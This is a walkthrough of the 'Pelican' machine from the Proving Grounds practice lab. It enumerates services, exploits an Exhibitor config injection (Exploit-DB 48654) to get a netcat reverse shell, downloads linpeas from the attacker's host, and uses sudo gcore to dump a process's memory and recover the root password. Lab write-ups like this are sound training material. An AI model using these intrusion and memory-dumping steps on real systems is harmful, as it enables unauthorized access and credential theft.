---
description: Pg Practice Pelican writeup
---

# Pelican

![](<../../../.gitbook/assets/image (788).png>)

## Nmap

```
sudo nmap 192.168.189.98 -sS -sV -p-                                                                                                                                                                                             130 ⨯

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open  http        Jetty 1.0
8081/tcp  open  http        nginx 1.14.2
44091/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SMB

We start this box on SMB and perform a quick null authentication check using `smbmap` against the target.

```
smbmap -u '' -p '' -R -H 192.168.189.98
```

![](<../../../.gitbook/assets/image (710).png>)

We have no luck here. I then run enum4linux against the target to look for users, groups and to perform RID cycling.

```
enum4linux -U -G -r 192.168.189.98
```

As `Enum4linux` output is quite messy I have opted to not post the gathered information but essentially from this we have found the user '_charles_' on the target machine. We can store this information for later.

## HTTP

I ran `feroxbuster` against port 8080 and 8081 and did not find any valid results. `Nikto` did not find any significant finds either.

When browsing to port 8080 we come to an application called 'Exhibitor'.

![http://192.168.189.98:8080/exhibitor/v1/ui/index.html](<../../../.gitbook/assets/image (711).png>)

When searching on Google for known exploits we are directed to a RCE vulnerability that exists in versions of Exhibitor where 'Java.env script' configuration parameter exists under the 'Config' tab.

## Exploitation

{% embed url="https://www.exploit-db.com/exploits/48654" %}

The relevant part of the exploit code is the following:

![](<../../../.gitbook/assets/image (712).png>)

I then made the changes as recommended in the PoC.

![](<../../../.gitbook/assets/image (713).png>)

Start up a `netcat` listener on the attacking machine.

```
nc -lvp 443
```

Then commit the changes in Exhibitor. You will be warned about the Exhibitor server restarting and when it comes up you should land a shell.

## Low Privilege Shell

![](<../../../.gitbook/assets/image (715).png>)

We can then upgrade our shell a little bit:

```
/usr/bin/script -qc /bin/bash /dev/null
```

## Privilege Escalation

As per usual I then started a python server on my attacking machine with `python2 -m SimpleHTTPServer` and then downloaded `linpeas.sh` with `wget`.

```
wget http://<Attacking-IP>/linpeas.sh
```

After `linpeas.sh` was downloaded I then executed the batch file. linpeas soon identifies that we have access to the following sudo command:

![](<../../../.gitbook/assets/image (716).png>)

Looking up `gcore` on Google we see it is an application for dumping information out of memory for running processes. Considering we can run this as any account defined by (ALL) with no password 'NOPASSWD' we can run it as root.

Looking further down linpeas we can see the following SUID permission files one of which has an interesting name of '/usr/bin/password-store'.

![](<../../../.gitbook/assets/image (717).png>)

We can check if this is a running process which can be dumped with `gcore`.

![](<../../../.gitbook/assets/image (718).png>)

We can attempt to dump this with `gcore`. The syntax for our command is as follows:

```
sudo -u root /usr/bin/gcore -a -o <outputfile> <pid>
```

or in my case:

```
sudo -u root /usr/bin/gcore -a -o /home/charles/output 493
```

Once the command completed I moved to the destination directory and run the strings command on the file to make it more human readable.

In the output of the text you will see a field with a value under it called '001 Password: root:' grab the value under this and attempt to login to root with the `su` command.

![](<../../../.gitbook/assets/image (720).png>)
